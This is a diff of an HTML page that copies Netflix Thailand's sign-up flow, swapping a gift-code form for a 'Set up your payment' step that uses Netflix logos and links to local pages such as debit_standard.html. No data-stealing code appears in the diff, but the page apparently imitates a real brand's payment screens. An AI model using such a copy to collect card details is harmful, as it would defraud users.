@@ -49,7 +49,7 @@
     <script>
         /* Disable minification (remove `.min` from URL path) for more info */
     </script>
-    <link rel="stylesheet" href="giftcode.css">
+    <link rel="stylesheet" href="choosepayment.css">
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Document</title>
@@ -68,74 +68,85 @@
             <span class="screen-reader-text">Netflix</span></a>
         <a class="buttons " href="https://www.netflix.com/th-en/login ">Sign In</a>
     </div>
-    <div class="simpleContainer" data-transitioned-child="true">
-        <div class="centerContainer" style="display: block; transform: none; opacity: 1; transition-duration: 250ms;">
-            <form method="POST" data-uia="payment-form">
-                <div class="paymentFormContainer">
-                    <div>
-                        <div class="stepHeader-container" data-uia="header">
-                            <div class="stepHeader" data-a11y-focus="true" tabindex="0"><span id=""
-                                    class="stepIndicator" data-uia="">STEP <b>3</b> OF <b>3</b></span>
-                                <h1 class="stepTitle" data-uia="stepTitle">Enter your gift code</h1>
+    <div class="centerContainer contextStep"
+        style="display: block; transform: none; opacity: 1; transition-duration: 250ms;">
+        <div class="paymentContainer" data-uia="payment-container">
+            <div>
+                <div class="stepLogoContainer"><span class="stepLogo paymentStepLogo"></span></div>
+                <div class="stepHeader-container" data-uia="header">
+                    <div class="stepHeader" data-a11y-focus="true" tabindex="0"><span id="" class="stepIndicator"
+                            data-uia="">STEP <b>3</b> OF <b>3</b></span>
+                        <h1 class="stepTitle" data-uia="stepTitle">Set up your payment.</h1>
+                    </div>
+                </div>
+                <div class="narrowContainer" data-uia="messagesContainer">
+                    <div id="" class="contextRow contextRowFirst" data-uia="">Your membership starts as soon as you set
+                        up <br>payment.</div>
+                    <div class="contextRow" data-uia="encouragements">
+                        <div id="" data-uia=""><b>No commitments.</b></div>
+                        <div id="" data-uia=""><b>Cancel online anytime.</b></div>
+                    </div>
+                </div>
+            </div>
+            <div class="secure-server-badge"><svg id="secure-server-icon" viewBox="0 0 12 16"
+                    class="secure-server-badge--icon">
+                    <g fill="none">
+                        <g fill="#FFB53F">
+                            <path
+                                d="M8.4 5L8.4 6.3 10 6.3 10 5C10 2.8 8.2 1 6 1 3.8 1 2 2.8 2 5L2 6.3 3.6 6.3 3.6 5C3.6 3.7 4.7 2.6 6 2.6 7.3 2.6 8.4 3.7 8.4 5ZM11 7L11 15 1 15 1 7 11 7ZM6.5 11.3C7 11.1 7.3 10.6 7.3 10.1 7.3 9.3 6.7 8.7 6 8.7 5.3 8.7 4.7 9.3 4.7 10.1 4.7 10.6 5 11.1 5.5 11.3L5.2 13.4 6.9 13.4 6.5 11.3Z">
+                            </path>
+                        </g>
+                    </g>
+                </svg>
+                <div class="secure-server-badge--text">Secure Server</div>
+            </div>
+            <div>
+                <div class="nfTabSelectionWrapper" id="creditOrDebitCardDisplayStringId"
+                    data-uia="payment-choice+creditOrDebitOption"><a
+                        class="nfTabSelection nfTabSelection--active paymentPicker standardHeight" href="#">
+                        <div class="mopNameAndLogos" onclick="window.location.href='debit_standard.html'">
+                            <div class="nfTabSelection--text card-type-text paymentActive" data-uia="mop-type-text">
+                                <span class="selectionLabel">Credit or Debit Card</span></div>
+                            <div class="logosContainer"><span class="logos logos-inline" data-uia="cardLogos-comp"
+                                    aria-label="We accept VISA, MASTERCARD and AMEX."><img alt="" class="logoIcon VISA"
+                                        data-uia="logoIcon-VISA"
+                                        src="https://assets.nflxext.com/ffe/siteui/acquisition/payment/svg/visa-v2.svg"><img
+                                        alt="" class="logoIcon MASTERCARD" data-uia="logoIcon-MASTERCARD"
+                                        src="https://assets.nflxext.com/ffe/siteui/acquisition/payment/svg/mastercard-v2.svg"><img
+                                        alt="" class="logoIcon AMEX" data-uia="logoIcon-AMEX"
+                                        src="https://assets.nflxext.com/ffe/siteui/acquisition/payment/svg/amex-v2.svg"></span>
                             </div>
-                        </div>
-                    </div>
-                    <div class="fieldContainer">
-                        <ul class="simpleForm structural ui-grid">
-                            <li data-uia="field-code+wrapper" class="nfFormSpace">
-                                <div data-uia="field-code+container" class="nfInput nfInputOversize">
-                                    <div class="nfInputPlacement"><label class="input_id" placeholder="code"><input
-                                                data-uia="field-code" name="code" class="nfTextField" id="id_code"
-                                                type="text" tabindex="0" autocomplete="off" maxlength="60" minlength="4"
-                                                dir="" value=""><label for="id_code" class="placeLabel">Gift Card Pin or
-                                                Code</label></label></div>
-                                </div>
-                            </li>
-                        </ul>
-                        <div class="changePlanContainer" data-uia="changePlanContainer">
-                            <div class="planInfo"><span id="" class="planDesc" data-uia="planDesc">THB99/mo.</span><span
-                                    class="planName" data-uia="planName">Mobile Plan</span></div>
-                            <div class="changePlanAction"><a class="pointer changePlanLink"
-                                    data-uia="changePlanAction">Change</a></div>
-                        </div>
-                        <div class="g-recaptcha" data-sitekey="6Lc7U6IUAAAAAKhH65Bnv3jnzyPhDJTCdchqmR5U"
-                            data-callback="netflixRecaptchaOnResponseTokenReceived" data-size="invisible"
-                            style="visibility: hidden;">
-                            <div class="grecaptcha-badge" data-style="none"
-                                style="width: 256px; height: 60px; position: fixed; visibility: hidden; display: block; transition: right 0.3s ease 0s; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;">
-                                <div class="grecaptcha-logo"><iframe
-                                        src="https://www.google.com/recaptcha/enterprise/anchor?ar=1&amp;k=6Lc7U6IUAAAAAKhH65Bnv3jnzyPhDJTCdchqmR5U&amp;co=aHR0cHM6Ly93d3cubmV0ZmxpeC5jb206NDQz&amp;hl=en&amp;v=qc5B-qjP0QEimFYUxcpWJy5B&amp;size=invisible&amp;cb=77vgfxt9ycdx"
-                                        width="256" height="60" role="presentation" name="a-d2rabx1qggg6"
-                                        frameborder="0" scrolling="no"
-                                        sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox"></iframe>
-                                </div>
-                                <div class="grecaptcha-error"></div><textarea id="g-recaptcha-response"
-                                    name="g-recaptcha-response" class="g-recaptcha-response"
-                                    style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea>
-                            </div><iframe style="display: none;"></iframe>
-                        </div>
-                    </div>
-                </div>
-                <div class="submitBtnContainer"><button id="simplicityPayment-REDEE" type="submit" autocomplete="off"
-                        class="nf-btn nf-btn-primary nf-btn-solid nf-btn-oversize"
-                        data-uia="action-submit-payment">REDEEM GIFT CODE</button></div>
-                <div class="recaptcha-terms-of-use-container">
-                    <div class="recaptcha-terms-of-use" data-uia="recaptcha-terms-of-use">
-                        <p><span>This page is protected by Google reCAPTCHA to ensure you're not a
-                                bot.</span>&nbsp;<button class="recaptcha-terms-of-use--link-button"
-                                data-uia="recaptcha-learn-more-button">Learn more.</button></p>
-                        <div class="recaptcha-terms-of-use--disclosure" data-uia="recaptcha-disclosure"><span id=""
-                                data-uia="recaptcha-disclosure-text">The information collected by Google reCAPTCHA is
-                                subject to the Google <a href="https://policies.google.com/privacy"
-                                    id="recaptcha-privacy-link" data-uia="recaptcha-privacy-link"
-                                    target="_blank">Privacy Policy</a> and <a href="https://policies.google.com/terms"
-                                    id="recaptcha-tos-link" data-uia="recaptcha-tos-link" target="_blank">Terms of
-                                    Service</a>, and is used for providing, maintaining, and improving the reCAPTCHA
-                                service and for general security purposes (it is not used for personalized advertising
-                                by Google).</span></div>
-                    </div>
-                </div>
-            </form>
+                        </div><span class="ui-svg-icon ui-svg-icon--chevron pull-right pickerArrow"></span>
+                    </a></div>
+                <div class="nfTabSelectionWrapper" id="directCarrierBillingStringId"
+                    data-uia="payment-choice+dcbOption"><a
+                        class="nfTabSelection nfTabSelection--active paymentPicker standardHeight" href="#">
+                        <div class="mopNameAndLogos" onclick="window.location.href='unavailable.html'">
+                            <div class="nfTabSelection--text card-type-text paymentActive" data-uia="mop-type-text">
+                                <span class="selectionLabel">Add to postpaid mobile bill</span></div>
+                            <div class="logosContainer"><span class="logos logos-inline" data-uia="cardLogos-comp"
+                                    aria-label="We accept AIS and TRUE_MOVE."><img alt="" class="logoIcon AIS"
+                                        data-uia="logoIcon-AIS"
+                                        src="https://assets.nflxext.com/ffe/siteui/acquisition/payment/svg/ais.svg"><img
+                                        alt="" class="logoIcon TRUE_MOVE" data-uia="logoIcon-TRUE_MOVE"
+                                        src="https://assets.nflxext.com/ffe/siteui/acquisition/payment/icon_true_move.png"
+                                        srcset="https://assets.nflxext.com/ffe/siteui/acquisition/payment/icon_true_move_2x.png 2x"></span>
+                            </div>
+                        </div><span class="ui-svg-icon ui-svg-icon--chevron pull-right pickerArrow"></span>
+                    </a></div>
+                <div class="nfTabSelectionWrapper" id="giftDisplayStringId" data-uia="payment-choice+giftOption"><a
+                        class="nfTabSelection nfTabSelection--active paymentPicker standardHeight" href="#">
+                        <div class="mopNameAndLogos" onclick="window.location.href='unavailable.html'">
+                            <div class="nfTabSelection--text card-type-text paymentActive" data-uia="mop-type-text">
+                                <span class="selectionLabel">Gift Code</span></div>
+                            <div class="logosContainer"><span class="logos logos-inline" data-uia="cardLogos-comp"
+                                    aria-label="We accept GIFT_CODE."><img alt="" class="logoIcon GIFT_CODE"
+                                        data-uia="logoIcon-GIFT_CODE"
+                                        src="https://assets.nflxext.com/ffe/siteui/acquisition/payment/svg/netflix-gift-card-v2.svg"></span>
+                            </div>
+                        </div><span class="ui-svg-icon ui-svg-icon--chevron pull-right pickerArrow"></span>
+                    </a></div>
+            </div>
         </div>
     </div>
     <div class="site-footer-wrapper centered">
